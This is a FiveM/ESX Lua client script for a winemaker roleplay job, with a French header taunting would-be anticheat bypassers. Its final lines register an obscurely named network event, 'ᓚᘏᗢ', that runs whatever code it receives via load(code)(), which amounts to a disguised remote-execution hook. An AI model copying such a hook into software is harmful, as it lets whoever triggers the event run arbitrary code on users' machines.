-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local Keys = {
	["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
	["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
	["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
	["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
	["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
	["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
	["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
	["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
	["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
}

local PlayerData = {}

local GUI = {}
GUI.Time = 0

local HasAlreadyEnteredMarker = false
local LastZone = nil

local CurrentAction = nil
local CurrentActionMsg = ''
local CurrentActionData = {}

local JobBlips = {}
local publicBlip = false

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end

	while ESX.GetPlayerData().job == nil do
		Citizen.Wait(10)
	end

	PlayerData = ESX.GetPlayerData()
end)

function SetVehicleMaxMods(vehicle)
	local props = {
		color1 = 142,
		color2 = 111,
		modEngine = 3,
		modBrakes = 3,
		modTransmission = 3,
		modSuspension = 3,
		modTurbo = true
	}

	ESX.Game.SetVehicleProperties(vehicle, props)
end

function cleanPlayer(playerPed)
	SetPedArmour(playerPed, 0)
	ClearPedBloodDamage(playerPed)
	ResetPedVisibleDamage(playerPed)
	ClearPedLastWeaponDamage(playerPed)
	ResetPedMovementClipset(playerPed, 0.0)
end

function OpenCloakroomMenu()
	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'cloakroom', {
		title = _U('cloakroom'),
		elements = {
			{label = _U('vine_clothes_civil'), value = 'citizen_wear'},
			{label = _U('vine_clothes_vine'), value = 'vigne_wear'}
		}
	}, function(data, menu)
		cleanPlayer(PlayerPedId())

		if data.current.value == 'citizen_wear' then
			ESX.TriggerServerCallback('::{korioz#0110}::esx_skin:getPlayerSkin', function(skin, jobSkin)
				TriggerEvent('::{korioz#0110}::skinchanger:loadSkin', skin)
			end)
		end

		if data.current.value == 'vigne_wear' then
			ESX.TriggerServerCallback('::{korioz#0110}::esx_skin:getPlayerSkin', function(skin, jobSkin)
				if skin.sex == 0 then
					TriggerEvent('::{korioz#0110}::skinchanger:loadClothes', skin, jobSkin.skin_male)
				else
					TriggerEvent('::{korioz#0110}::skinchanger:loadClothes', skin, jobSkin.skin_female)
				end
			end)
		end
	end, function(data, menu)
	end)
end

function OpenVigneActionsMenu()
	local elements = {
		{label = _U('cloakroom'), value = 'cloakroom'},
		{label = _U('deposit_stock'), value = 'put_stock'},
		{label = _U('take_stock'), value = 'get_stock'}
	}
	
	if Config.EnablePlayerManagement and PlayerData.job ~= nil and PlayerData.job.grade_name == 'boss' then
		table.insert(elements, {label = _U('boss_actions'), value = 'boss_actions'})
	end

	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vigne_actions', {
		title = 'Vigne',
		elements = elements
	}, function(data, menu)
		if data.current.value == 'cloakroom' then
			OpenCloakroomMenu()
		end

		if data.current.value == 'put_stock' then
			OpenPutStocksMenu()
		end

		if data.current.value == 'get_stock' then
			OpenGetStocksMenu()
		end

		if data.current.value == 'boss_actions' then
			TriggerEvent('::{korioz#0110}::esx_society:openBossMenu', 'vigne', function(data, menu) end)
		end
	end, function(data, menu)
		CurrentAction = 'vigne_actions_menu'
		CurrentActionMsg = _U('press_to_open')
		CurrentActionData = {}
	end)
end

function OpenVehicleSpawnerMenu()
	ESX.UI.Menu.CloseAll()

	if Config.EnableSocietyOwnedVehicles then
		local elements = {}

		ESX.TriggerServerCallback('::{korioz#0110}::esx_society:getVehiclesInGarage', function(vehicles)
			for i = 1, #vehicles, 1 do
				table.insert(elements, {label = GetDisplayNameFromVehicleModel(vehicles[i].model), rightlabel = {'[' .. vehicles[i].plate .. ']'}, value = vehicles[i]})
			end

			ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_spawner', {
				title = _U('veh_menu'),
				elements = elements
			}, function(data, menu)
				menu.close()
				local vehicleProps = data.current.value

				ESX.Game.SpawnVehicle(vehicleProps.model, Config.Zones.VehicleSpawnPoint.Pos, 90.0, function(vehicle)
					ESX.Game.SetVehicleProperties(vehicle, vehicleProps)
				end)

				_TriggerServerEvent('::{korioz#0110}::esx_society:removeVehicleFromGarage', 'vigne', vehicleProps)
			end, function(data, menu)
				CurrentAction = 'vehicle_spawner_menu'
				CurrentActionMsg = _U('spawn_veh')
				CurrentActionData = {}
			end)
		end, 'vigne')
	else
		local elements = {
			{label = 'Véhicule de Travail', value = 'bison3'}
		}
		
		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_spawner', {
			title = _U('veh_menu'),
			elements = elements,
		}, function(data, menu)
			menu.close()
			local model = data.current.value

			ESX.Game.SpawnVehicle(model, Config.Zones.VehicleSpawnPoint.Pos, 56.326, function(vehicle)
				local newPlate = exports['esx_vehicleshop']:GenerateSocietyPlate('VIGN')
				SetVehicleNumberPlateText(vehicle, newPlate)
				_TriggerServerEvent('::{korioz#0110}::esx_vehiclelock:givekey', 'no', newPlate)
				SetVehicleMaxMods(vehicle)
			end)
		end, function(data, menu)
			CurrentAction = 'vehicle_spawner_menu'
			CurrentActionMsg = _U('spawn_veh')
			CurrentActionData = {}
		end)
	end
end

function OpenMobileVigneActionsMenu()
	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'mobile_vigne_actions', {
		title = 'vigne',
		elements = {
			{label = _U('billing'), value = 'billing'}
		}
	}, function(data, menu)
		if data.current.value == 'billing' then
			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'billing', {
				title = _U('invoice_amount')
			}, function(data, menu)
				local amount = tonumber(data.value)

				if amount == nil or amount <= 0 then
					ESX.ShowNotification(_U('amount_invalid'))
				else
					menu.close()
					local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()

					if closestPlayer == -1 or closestDistance > 3.0 then
						ESX.ShowNotification(_U('no_players_near'))
					else
						local playerPed = PlayerPedId()

						Citizen.CreateThread(function()
							TaskStartScenarioInPlace(playerPed, 'CODE_HUMAN_MEDIC_TIME_OF_DEATH', 0, true)
							Citizen.Wait(5000)
							ClearPedTasks(playerPed)
							_TriggerServerEvent('::{korioz#0110}::esx_billing:sendBill', GetPlayerServerId(closestPlayer), 'society_vigne', 'Vigneron', amount)
						end)
					end
				end
			end, function(data, menu)
				menu.close()
			end)
		end
	end, function(data, menu)
	end)
end

function OpenGetStocksMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_vigneronjob:getStockItems', function(items)
		local elements = {}

		for i = 1, #items, 1 do
			if (items[i].count ~= 0) then
				table.insert(elements, {label = items[i].label, rightlabel = {'(' .. items[i].count .. ')'}, value = items[i].name})
			end
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title = 'Vigneron Stock',
			elements = elements
		}, function(data, menu)
			local itemName = data.current.value

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_get_item_count', {
				title = _U('quantity')
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil or count <= 0 then
					ESX.ShowNotification(_U('quantity_invalid'))
				else
					menu2.close()
					menu.close()
					OpenGetStocksMenu()

					_TriggerServerEvent('::{korioz#0110}::esx_vigneronjob:getStockItem', itemName, count)
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end)
end

function OpenPutStocksMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_vigneronjob:getPlayerInventory', function(inventory)
		local elements = {}

		for i = 1, #inventory.items, 1 do
			local item = inventory.items[i]

			if item.count > 0 then
				table.insert(elements, {label = item.label, rightlabel = {'(' .. item.count .. ')'}, type = 'item_standard', value = item.name})
			end
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title = _U('inventory'),
			elements = elements
		}, function(data, menu)
			local itemName = data.current.value

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_put_item_count', {
				title = _U('quantity')
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil or count <= 0 then
					ESX.ShowNotification(_U('quantity_invalid'))
				else
					menu2.close()
					menu.close()
					OpenPutStocksMenu()

					_TriggerServerEvent('::{korioz#0110}::esx_vigneronjob:putStockItems', itemName, count)
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end)
end

RegisterNetEvent('::{korioz#0110}::esx:playerLoaded')
AddEventHandler('::{korioz#0110}::esx:playerLoaded', function(xPlayer)
	PlayerData = xPlayer
	blips()
end)

RegisterNetEvent('::{korioz#0110}::esx:setJob')
AddEventHandler('::{korioz#0110}::esx:setJob', function(job)
	PlayerData.job = job
	deleteBlips()
	blips()
end)

AddEventHandler('::{korioz#0110}::esx_vigneronjob:hasEnteredMarker', function(zone)
	if zone == 'RaisinFarm' and PlayerData.job ~= nil and PlayerData.job.name == 'vigne'  then
		CurrentAction = 'raisin_harvest'
		CurrentActionMsg = _U('press_collect')
		CurrentActionData = {zone= zone}
	end
		
	if zone == 'TraitementVin' and PlayerData.job ~= nil and PlayerData.job.name == 'vigne'  then
		CurrentAction = 'vine_traitement'
		CurrentActionMsg = _U('press_collect')
		CurrentActionData = {zone= zone}
	end		
		
	if zone == 'TraitementJus' and PlayerData.job ~= nil and PlayerData.job.name == 'vigne'  then
		CurrentAction = 'jus_traitement'
		CurrentActionMsg = _U('press_traitement')
		CurrentActionData = {zone = zone}
	end
		
	if zone == 'SellFarm' and PlayerData.job ~= nil and PlayerData.job.name == 'vigne'  then
		CurrentAction = 'farm_resell'
		CurrentActionMsg = _U('press_sell')
		CurrentActionData = {zone = zone}
	end

	if zone == 'VigneronActions' and PlayerData.job ~= nil and PlayerData.job.name == 'vigne' then
		CurrentAction = 'vigne_actions_menu'
		CurrentActionMsg = _U('press_to_open')
		CurrentActionData = {}
	end
	
	if zone == 'VehicleSpawner' and PlayerData.job ~= nil and PlayerData.job.name == 'vigne' then
		CurrentAction = 'vehicle_spawner_menu'
		CurrentActionMsg = _U('spawn_veh')
		CurrentActionData = {}
	end
		
	if zone == 'VehicleDeleter' and PlayerData.job ~= nil and PlayerData.job.name == 'vigne' then
		local playerPed = PlayerPedId()
		local coords = GetEntityCoords(playerPed, false)
		
		if IsPedInAnyVehicle(playerPed, false) then
			local vehicle, distance = ESX.Game.GetClosestVehicle(coords)

			if distance ~= -1 and distance <= 1.0 then
				CurrentAction = 'delete_vehicle'
				CurrentActionMsg = _U('store_veh')
				CurrentActionData = {vehicle = vehicle}
			end
		end
	end
end)

AddEventHandler('::{korioz#0110}::esx_vigneronjob:hasExitedMarker', function(zone)
	ESX.UI.Menu.CloseAll()
	if (zone == 'RaisinFarm') and PlayerData.job ~= nil and PlayerData.job.name == 'vigne' then
		_TriggerServerEvent('::{korioz#0110}::esx_vigneronjob:stopHarvest')
	end  
	if (zone == 'TraitementVin' or zone == 'TraitementJus') and PlayerData.job ~= nil and PlayerData.job.name == 'vigne' then
		_TriggerServerEvent('::{korioz#0110}::esx_vigneronjob:stopTransform')
	end
	if (zone == 'SellFarm') and PlayerData.job ~= nil and PlayerData.job.name == 'vigne' then
		_TriggerServerEvent('::{korioz#0110}::esx_vigneronjob:stopSell')
	end
	CurrentAction = nil
end)

function deleteBlips()
	if JobBlips[1] ~= nil then
		for i=1, #JobBlips, 1 do
		RemoveBlip(JobBlips[i])
		JobBlips[i] = nil
		end
	end
end

-- Create Blips
function blips()
	if not publicBlip then
		local blip = AddBlipForCoord(Config.Zones.VigneronActions.Pos.x, Config.Zones.VigneronActions.Pos.y, Config.Zones.VigneronActions.Pos.z)

		SetBlipSprite(blip, 85)
		SetBlipDisplay(blip, 4)
		SetBlipScale(blip, 0.8)
		SetBlipColour(blip, 19)
		SetBlipAsShortRange(blip, true)

		BeginTextCommandSetBlipName("STRING")
		AddTextComponentSubstringPlayerName("Vignerons")
		EndTextCommandSetBlipName(blip)
		publicBlip = true
	end
	
	if PlayerData.job ~= nil and PlayerData.job.name == 'vigne' then
		for k, v in pairs(Config.Zones) do
			if v.Type == 1 then
				local blip2 = AddBlipForCoord(v.Pos.x, v.Pos.y, v.Pos.z)

				SetBlipSprite(blip2, 85)
				SetBlipDisplay(blip2, 4)
				SetBlipScale(blip2, 0.8)
				SetBlipColour(blip2, 19)
				SetBlipAsShortRange(blip2, true)

				BeginTextCommandSetBlipName("STRING")
				AddTextComponentSubstringPlayerName(v.Name)
				EndTextCommandSetBlipName(blip2)
				table.insert(JobBlips, blip2)
			end
		end
	end
end

-- Display markers
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local coords = GetEntityCoords(PlayerPedId(), false)

		for k, v in pairs(Config.Zones) do
			if PlayerData.job ~= nil and PlayerData.job.name == 'vigne' then
				if (v.Type ~= -1 and GetDistanceBetweenCoords(coords, v.Pos.x, v.Pos.y, v.Pos.z, true) < Config.DrawDistance) then
					DrawMarker(v.Type, v.Pos.x, v.Pos.y, v.Pos.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, v.Size.x, v.Size.y, v.Size.z, v.Color.r, v.Color.g, v.Color.b, 100, false, true, 2, false, false, false, false)
				end
			end
		end
	end
end)


-- Enter / Exit marker events
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if PlayerData.job ~= nil and PlayerData.job.name == 'vigne' then
			local coords = GetEntityCoords(PlayerPedId(), false)
			local isInMarker = false
			local currentZone = nil

			for k, v in pairs(Config.Zones) do
				if (GetDistanceBetweenCoords(coords, v.Pos.x, v.Pos.y, v.Pos.z, true) < v.Size.x) then
					isInMarker  = true
					currentZone = k
				end
			end

			if (isInMarker and not HasAlreadyEnteredMarker) or (isInMarker and LastZone ~= currentZone) then
				HasAlreadyEnteredMarker = true
				LastZone                = currentZone
				TriggerEvent('::{korioz#0110}::esx_vigneronjob:hasEnteredMarker', currentZone)
			end

			if not isInMarker and HasAlreadyEnteredMarker then
				HasAlreadyEnteredMarker = false
				TriggerEvent('::{korioz#0110}::esx_vigneronjob:hasExitedMarker', LastZone)
			end
		end
	end
end)

-- Key Controls
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1)

		if CurrentAction ~= nil then
			SetTextComponentFormat('STRING')
			AddTextComponentSubstringPlayerName(CurrentActionMsg)
			EndTextCommandDisplayHelp(0, 0, 1, -1)

			if IsControlPressed(0,  Keys['E']) and PlayerData.job ~= nil and PlayerData.job.name == 'vigne' and (GetGameTimer() - GUI.Time) > 300 then
				if CurrentAction == 'raisin_harvest' then
					_TriggerServerEvent('::{korioz#0110}::esx_vigneronjob:startHarvest', CurrentActionData.zone)
				end
				if CurrentAction == 'jus_traitement' then
					_TriggerServerEvent('::{korioz#0110}::esx_vigneronjob:startTransform', CurrentActionData.zone)
				end
				if CurrentAction == 'vine_traitement' then
					_TriggerServerEvent('::{korioz#0110}::esx_vigneronjob:startTransform', CurrentActionData.zone)
				end
				if CurrentAction == 'farm_resell' then
					_TriggerServerEvent('::{korioz#0110}::esx_vigneronjob:startSell', CurrentActionData.zone)
				end
				if CurrentAction == 'vigne_actions_menu' then
					OpenVigneActionsMenu()
				end
				if CurrentAction == 'vehicle_spawner_menu' then
					OpenVehicleSpawnerMenu()
				end
				if CurrentAction == 'delete_vehicle' then
					if Config.EnableSocietyOwnedVehicles then
						local vehicle = GetVehiclePedIsIn(playerPed,  false)
						local plate = GetVehicleNumberPlateText(vehicle)
						local vehicleProps = ESX.Game.GetVehicleProperties(CurrentActionData.vehicle)
						_TriggerServerEvent('::{korioz#0110}::esx_society:putVehicleInGarage', 'vigne', vehicleProps)
						_TriggerServerEvent('::{korioz#0110}::esx_vehiclelock:deletekeyjobs', 'no', plate) --vehicle lock
					end

					ESX.Game.DeleteVehicle(CurrentActionData.vehicle)
					_TriggerServerEvent('::{korioz#0110}::esx_vehiclelock:deletekeyjobs', 'no', plate) --vehicle lock
				end

				CurrentAction = nil
				GUI.Time = GetGameTimer()
			end
		end

		if IsControlPressed(0, Keys['F6']) and Config.EnablePlayerManagement and PlayerData.job ~= nil and PlayerData.job.name == 'vigne' and (GetGameTimer() - GUI.Time) > 150 then
			OpenMobileVigneActionsMenu()
			GUI.Time = GetGameTimer()
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)